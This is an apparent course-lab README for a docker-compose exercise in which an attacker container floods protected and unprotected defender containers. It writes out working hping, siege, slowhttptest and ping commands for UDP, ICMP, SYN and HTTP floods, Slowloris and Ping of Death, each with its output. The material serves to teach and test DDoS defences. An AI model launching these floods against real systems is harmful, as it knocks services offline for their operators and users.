# HSA L14: DDoS Attacks
Try to implement protection on Defender container
Launch attacker scripts and examine you protection

## Overview
1. Attacker Container - contains scripts that will implement 6 attacks (UDP flood, ICMP flood, HTTP flood, Slowloris, SYN flood,  Ping of Death).
1. Defender container with protection.
1. Defender container without protection.

## Getting Started

### Preparation
1. Run the docker containers.
```bash
  docker-compose up -d
```

Be sure to use ```docker-compose down -v``` to clean up after you're done with tests.

2. Run the attacker container.
```bash
docker-compose run attacker bash
```

## Test scenarios

### UDP flood
#### Without DDoS protection:
```bash
$ hping -c 100000 -d 128 -w 64 --flood --rand-source --udp -p 8080 defender-0

--- defender-0 hping statistic ---
2916410 packets tramitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms

$ curl -Is localhost:8080 | head -1
HTTP/1.1 200 OK
```
#### With DDoS protection:
```bash
$ hping -c 100000 -d 128 -w 64 --flood --rand-source --udp -p 8081 defender-1

--- defender-1 hping statistic ---
2785135 packets tramitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms

$ curl -Is localhost:8081 | head -1
HTTP/1.1 200 OK
```

### ICMP flood
#### Without DDoS protection:
```bash
$ hping defender-0 -c 1000 -d 128 -n -p 8080 --icmp --flood --rand-source

--- defender-0 hping statistic ---
1048299 packets tramitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms

$ curl -Is localhost:8080 | head -1
HTTP/1.1 200 OK
```
#### With DDoS protection:
```bash
$ hping defender-1 -c 1000 -d 128 -n -p 8081 --icmp --flood --rand-source

--- defender-1 hping statistic ---
893003 packets tramitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms

$ curl -Is localhost:8081 | head -1
HTTP/1.1 200 OK
```

### HTTP flood
#### Without DDoS protection:
```bash
$ siege -b -c 500 -t 1m defender-0

$ curl -XGET localhost:8080
curl: (52) Empty reply from server
```
#### With DDoS protection:
```bash
siege -b -c 500 -t 1m defender-1

Transactions:		         643 hits
Availability:		        9.60 %
Elapsed time:		       40.56 secs
Data transferred:	        6.61 MB
Response time:		       16.18 secs
Transaction rate:	       15.85 trans/sec
Throughput:		        0.16 MB/sec
Concurrency:		      256.58
Successful transactions:         643
Failed transactions:	        6052
Longest transaction:	       24.49
Shortest transaction:	        0.00
```

### Slowloris
#### Without DDoS protection:
```bash
$ slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://defender-0 -x 24 -p 3
Slow HTTP test status:

initializing:        0
pending:             0
connected:           10
error:               0
closed:              250
service available:   NO

$ curl -XGET localhost:8080
curl: (52) Empty reply from server
```
#### With DDoS protection:
```bash
$ slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://defender-1 -x 24 -p 3
Slow HTTP test status:
initializing:        0
pending:             0
connected:           162
error:               0
closed:              838
service available:   YES

$ curl -Is localhost:8081 | head -1
HTTP/1.1 200 OK
```

### SYN flood
#### Without DDoS protection:
```bash
$ hping defender-0 -p 8080 -c 1000 -d 128 -S -n --flood --rand-source

--- defender-0 hping statistic ---
2741951 packets tramitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms

$ curl -Is localhost:8080 | head -1
HTTP/1.1 200 OK
```
#### With DDoS protection:
```bash
$ hping defender-1 -p 8081 -c 1000 -d 128 -S -n --flood --rand-source

--- defender-1 hping statistic ---
2002331 packets tramitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms

$ curl -Is localhost:8081 | head -1
HTTP/1.1 200 OK
```

### Ping of Death
#### Without DDoS protection:
```bash
$ ping 172.16.238.20 -s 65488 -t 1 -n 1

--- 1 ping statistics ---
117 packets transmitted, 0 received, 100% packet loss, time 118789ms

$ curl -Is localhost:8080 | head -1
HTTP/1.1 200 OK
```
#### With DDoS protection:
```bash
$ ping 172.16.238.30 -s 65488 -t 1 -n 1

--- 1 ping statistics ---
200 packets transmitted, 0 received, 100% packet loss, time 162399ms

$ curl -Is localhost:8081 | head -1
HTTP/1.1 200 OK
```
